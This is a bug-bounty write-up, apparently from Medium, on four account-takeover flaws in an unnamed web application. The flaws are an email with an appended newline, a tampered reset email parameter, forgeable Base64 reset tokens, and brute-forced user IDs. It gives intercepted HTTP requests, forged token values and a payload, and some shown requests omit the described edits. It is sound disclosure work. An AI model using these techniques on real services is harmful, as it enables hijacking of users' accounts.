---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2020-05-18_multiple-flaws-leads-to-account-takeover-within-an-application.md
original_filename: 2020-05-18_multiple-flaws-leads-to-account-takeover-within-an-application.md
title: Multiple flaws leads to Account Takeover within an Application
category: documents
detected_topics:
- password-reset
- xss
- command-injection
- otp
- clickjacking
- cloud-security
tags:
- imported
- documents
- password-reset
- xss
- command-injection
- otp
- clickjacking
- cloud-security
language: en
raw_sha256: e82570976e90b3ce412f239cff3db3b4ee274f24667567e7a59fa211d005d53a
text_sha256: e81d26de69c82ceb72cef2c061e048ff16a5af7c9f87bd76dad1a0315aff2406
ingested_at: '2026-06-28T07:32:01Z'
sensitivity: unknown
redactions_applied: true
---

# Multiple flaws leads to Account Takeover within an Application

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2020-05-18_multiple-flaws-leads-to-account-takeover-within-an-application.md
- Source Type: markdown
- Detected Topics: password-reset, xss, command-injection, otp, clickjacking, cloud-security
- Ingested At: 2026-06-28T07:32:01Z
- Redactions Applied: True
- Raw SHA256: `e82570976e90b3ce412f239cff3db3b4ee274f24667567e7a59fa211d005d53a`
- Text SHA256: `e81d26de69c82ceb72cef2c061e048ff16a5af7c9f87bd76dad1a0315aff2406`


## Content

---
title: "Multiple flaws leads to Account Takeover within an Application"
url: "https://medium.com/hackcura/multiple-flaws-leads-to-account-takeover-within-an-application-9f64abfb1073"
authors: ["Harshit Sengar (@sengarharshit1)"]
bugs: ["Account takeover", "Password reset"]
publication_date: "2020-05-18"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4577
scraped_via: "browseros"
---

# Multiple flaws leads to Account Takeover within an Application

Top highlight

Multiple flaws leads to Account Takeover within an Application
Harshit Sengar
Follow
6 min read
·
May 19, 2020

730

3

Press enter or click to view image in full size

Hi folks, I tested an application that was too vulnerable. So, I thought about writing Account takeover test cases. I will not disclose the name of the company. In this writeup, I will use “company” as a company name.

I had two registered account and one unregistered account:

Victim : victim@gmail.com (registered)

Attacker : attacker@gmail.com (registered)

Dummy: abc@gmail.com (unregistered)

Let’s Start..,

# 1. Account Takeover through Sign-up functionality.

Note: Verification mails were not sending by the website.

Reproduction Steps:

a. I filled all details such as first name, last name, password, confirm password, email(with unregistered email, let’s say abc@gmail.com).

I filled abc@gmail.com because on each keystroke of email’s input field, a function was sending a request just to check the email is already registered or not. ( I also changed the response of checking email’s request of registered email from false to true, just only to bypass but there was no success).

b. Intercept the registration’s request of abc@gmail and send to BurpSuite’s repeater tab.

First, I changed the email from abc@gmail.com to victim@gmail.com and forward the request and there was no success means I was not able to registered with already registered email.

Original Request:

POST /user/register HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:76.0) Gecko/20100101 Firefox/76.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 100
Origin: https://www.company.com
Connection: close
Referer: https://www.company.com/user/sign-up
Cookie: ****cookies****

firstName=test&lastName=test&password=***REDACTED***

Edited Request:

POST /user/register HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:76.0) Gecko/20100101 Firefox/76.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 100
Origin: https://www.company.com
Connection: close
Referer: https://www.company.com/user/sign-up
Cookie: ****cookies****

firstName=test&lastName=test&password=***REDACTED***

Response:

HTTP/1.1 200 OK
Content-Type: application/json;charset=UTF-8
X-XSS-Protection: 1; mode=block
X-Frame-Options: SAMEORIGIN
X-Content-Type-Options: nosniff
Strict-Transport-Security: max-age=15724800; includeSubDomains
Expires: Wed, 01 April 2020 06:13:18 GMT
Cache-Control: max-age=0, no-cache, no-store
Pragma: no-cache
Date: Wed, 01 April 2020 06:13:18 GMT
Content-Length: 58
Connection: close

{“staus”:”error”,”registerStatus”:false,”redirect_to”:”/”}

Then, On the second time, I added “%0a” after “victim@gmail.com”.

payload: victim@gmail.com%a

And, this time, I got success to create an account with already registered account.

Edited Request:

POST /user/register HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:76.0) Gecko/20100101 Firefox/76.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 100
Origin: https://www.company.com
Connection: close
Referer: https://www.company.com/user/sign-up
Cookie: ****cookies****

firstName=test&lastName=test&password=***REDACTED***

Response:

HTTP/1.1 200 OK
Content-Type: application/json;charset=UTF-8
X-XSS-Protection: 1; mode=block
X-Frame-Options: SAMEORIGIN
X-Content-Type-Options: nosniff
Strict-Transport-Security: max-age=15724800; includeSubDomains
Expires: Wed, 01 April 2020 06:13:26 GMT
Cache-Control: max-age=0, no-cache, no-store
Pragma: no-cache
Date: Wed, 01 April 2020 06:13:26 GMT
Content-Length: 41
Connection: close
Set-Cookie: userid=398433;domain=www.company.com;path=/

{“registerStatus”:true,”redirect_to”:”/”}

And then, I checked the website page in the browser.

Voilla, I got access in the victim’s account.

# 2. Account Takeover through Password Reset functionality.

Reproduction Steps:

a. I visited to the login page and click on “forget password”.

b. Then, I filled the attacker email (attacker@gmail.com) in the input field and submit.

c. An password reset mail was sent to the attacker’s email and there was a link to reset the password in the mail.

d. I visited that link and a page was opened for reset the password. I filled new password and confirm password input field.

e. Intercept this request and change the email parameter’s value from “attacker@gmail.com” to “victim@gmail.com”.

Original Request:

POST /user/password-reset-done HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:76.0) Gecko/20100101 Firefox/76.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 80
Origin: https://www.company.com
Connection: close
Referer: https://www.company.com/user/reset-password/Mzk3Njk1LGF0dGFja2VyQGdtYWlsLmNvbQ==
Cookie: ****cookies****

email=attacker@gmail.com&password=***REDACTED***

Edited Request:

POST /user/password-reset-done HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:76.0) Gecko/20100101 Firefox/76.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 80
Origin: https://www.company.com
Connection: close
Referer: https://www.company.com/user/reset-password/Mzk3Njk1LGF0dGFja2VyQGdtYWlsLmNvbQ==
Cookie: ****cookies****

email=victim@gmail.com&password=***REDACTED***

Response:

HTTP/1.1 200 OK
Content-Type: application/json
X-XSS-Protection: 1; mode=block
X-Frame-Options: SAMEORIGIN
X-Content-Type-Options: nosniff
Strict-Transport-Security: max-age=15724800; includeSubDomains
Expires: Wed, 1 Apr 2020 07:20:44 GMT
Cache-Control: max-age=0, no-cache, no-store
Pragma: no-cache
Date: Wed, 1 Apr 2020 07:20:44 GMT
Content-Length: 20
Connection: close

{“status”:”success”}

f. Then, I visited the login page and filled the victim’s email and recent changed password and clicked on login button.

Get Harshit Sengar’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

Voilla, I got access in the victim’s account.

# 3. Account Takeover through weakly implemented password reset token.

Note: Any user can view other user’s profile and he/she can get user ID & email ID easily through visiting the any user’s profile.

Reproduction Steps:

a. I visited to the login page and click on “forget password”.

b. Then, I filled the attacker email (attacker@gmail.com) in the input field and submit.

c. An password reset mail was sent to the attacker’s email and there was a link to reset the password in the mail.

https://www.company.com/user/reset-password/Mzk3Njk1LGF0dGFja2VyQGdtYWlsLmNvbQ==

I noticed that the token was Base64 encoded.

Encoded Value: Mzk3Njk1LGF0dGFja2VyQGdtYWlsLmNvbQ==

Decoded Value: 397695,attacker@gmail.com

d. Then, I visited victim’s profile and got the Email ID and user ID.

e. Then, I encoded the user ID & Email Id to make password reset token.

Victim User ID : 397694

Victim Email Id: victim@gmail.com

Normal value to be Base64 Encoded : 397694,victim@gmail.com

Base64 Encoded Password Reset Token:

Mzk3Njk0LHZpY3RpbUBnbWFpbC5jb20=

f. I changed the Password Reset Token from the URL which is for the attacker.

original URL: https://www.company.com/user/reset-password/Mzk3Njk1LGF0dGFja2VyQGdtYWlsLmNvbQ==

Forged URL: https://www.company.com/user/reset-password/Mzk3Njk0LHZpY3RpbUBnbWFpbC5jb20=

g. When I visited the forged URL and It gave me password reset page.

h. I filled the new password and confirm password in the input fields and submit.

i. In response, There was 200 OK and success.

j. I visited the login page and filled the victim email and recent changed password and click on login button.

Voilla, I got access in the victim’s account.

# 4. Account Takeover through Reusable Password Reset Token.

Suppose, there is no way to get the user ID but there is a way to get the user’s Email ID.

Reproduction Steps:

a. I visited to the login page and click on “forget password”.

b. Then, I filled the attacker email (attacker@gmail.com) in the input field and submit.

c. An password reset mail was sent to the attacker’s email and there was a link to reset the password in the mail.

https://www.company.com/user/reset-password/Mzk3Njk1LGF0dGFja2VyQGdtYWlsLmNvbQ==

I noticed that the token was Base64 encoded.

Encoded Value: Mzk3Njk1LGF0dGFja2VyQGdtYWlsLmNvbQ==

Decoded Value: 397695,attacker@gmail.com

d. Then, I visited victim’s profile and got the Email ID

Victim User ID : ****** (means I didn’t know the user ID as assumption).

Victim Email Id: victim@gmail.com

e. Then, I forged the Password Reset URL to reset the victim’s password through the Python script.

As we know the token is Base64 encoded.

Here is the unforged URL

https://www.company.com/user/reset-password/1,victim@gmail.com

So, My script was all about to increase user ID and then encode it (integer,Victim-Email) in Base64.

And, Send the Request to forged Requests and check the response.

That request who was having 3XX Response code and showed that url in the output.

f. And then, I visited that URL and I was able to reset the Password of the victim.

And I got access into the victim’s Account.

Thanks Guys!!!

If you find any mistake and have some doubt in this write-up then please connect to me on Social Platform and tell me.

You can find me on Twitter, LinkedIn.
